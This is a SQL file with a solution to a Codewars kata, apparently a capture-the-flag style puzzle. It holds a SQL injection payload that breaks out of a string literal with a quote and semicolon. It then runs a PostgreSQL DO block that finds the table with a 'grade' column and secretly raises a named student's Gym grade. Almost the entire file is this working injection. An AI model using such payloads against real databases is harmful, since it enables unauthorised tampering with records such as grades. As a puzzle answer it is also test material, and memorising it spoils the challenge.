-- This PostgreSQL takes advantage of poor data security to change the grades of a student.
-- Link to challenge: https://www.codewars.com/kata/6535737a94f1d210ccf1895c/sql

';
DO $$
DECLARE
e TEXT:=(SELECT table_name FROM information_schema.columns WHERE column_name='grade');
BEGIN
EXECUTE 'UPDATE '||e||' SET grade=
(CASE
WHEN grade=''F'' THEN ''D''
WHEN grade=''D'' THEN ''C''
ELSE grade
END)
WHERE subject=''Gym'' AND student_id=(SELECT id FROM students WHERE name=''Eloise Rosen'')';
END;$$;
SELECT * FROM students
--
